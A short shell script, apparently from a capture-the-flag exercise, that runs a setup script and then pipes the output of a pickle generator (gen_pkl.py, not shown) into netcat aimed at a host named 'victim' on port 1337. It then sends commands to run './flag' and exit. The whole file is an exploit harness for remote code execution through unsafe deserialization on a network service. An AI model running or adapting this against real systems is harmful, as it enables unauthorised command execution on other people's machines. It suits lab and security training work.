#!/bin/sh

chmod +x /root/requirements.sh
./requirements.sh

{
	echo "$(python gen_pkl.py)"
	sleep 5
	echo "./flag"
	echo "exit"
} | nc victim 1337 | sed 's/>>> //'